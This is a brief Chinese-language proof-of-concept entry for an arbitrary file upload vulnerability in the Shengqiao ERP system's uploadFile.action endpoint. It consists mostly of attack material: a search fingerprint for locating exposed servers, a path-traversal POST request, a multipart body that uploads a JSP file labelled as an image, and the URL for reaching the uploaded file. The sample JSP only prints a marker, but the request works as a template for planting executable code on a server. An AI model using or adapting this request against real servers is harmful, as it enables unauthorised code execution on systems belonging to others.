# 圣乔ERP系统uploadFile存在任意文件上传漏洞

- **系统**：圣乔ERP系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="圣乔-ERP系统"`
- **请求**：`POST /erp/wap/../uploadFile.action HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=---------------------------452…`　`Content-Length: 10338`

**请求体 / payload**
```
-----------------------------45250802924973458471174811279
Content-Disposition: form-data; name="Filedata"; filename="123.jsp"
Content-Type: image/png
<%out.print(123456);%>
-----------------------------45250802924973458471174811279
上传定位：
GET /erp/wap/../FileStorageDirectorynull/123.jsp HTTP/1.1
```
- **预期**：200　|　“filedata”: